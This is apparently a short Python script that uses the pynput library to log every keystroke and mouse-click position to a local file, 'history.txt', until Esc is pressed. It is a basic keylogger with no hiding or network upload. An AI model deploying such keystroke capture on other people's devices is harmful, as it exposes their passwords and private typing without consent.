from pynput.mouse import Listener as mlistener
from pynput.keyboard import Key, Listener as klistener


from datetime import datetime
now = datetime.now()
current_time = now.strftime("%H:%M:%S")


f=open("history.txt", "a+")
f.write('\n\n-------------------------------------   ')
f.write(current_time)
f.write('   -------------------------------------\n\n')


def click(x, y, button, pressed):
    f.write('Pressed Mouse at Location - {0} \n'.format((x, y)))
    #print('Pressed Mouse at Location - {0} '.format((x, y)))
    



def keypress(key):
    f.write('Pressed - {0} \n'.format(key))
    #print('{0} pressed'.format(key))
    if key == Key.esc:
        return False

def keyrelease(key):
    f.write('{0} pressed\n'.format(key))
    #print('{0} release'.format(key))
    if key == Key.esc:
        return False


# Collect events until released
with mlistener(on_click = click) as listener:
    with klistener(on_press=keypress) as listener:
        listener.join()


f.write('\n\n-------------------------------------   ')
f.write(current_time)
f.write('   -------------------------------------\n\n')

f.close()


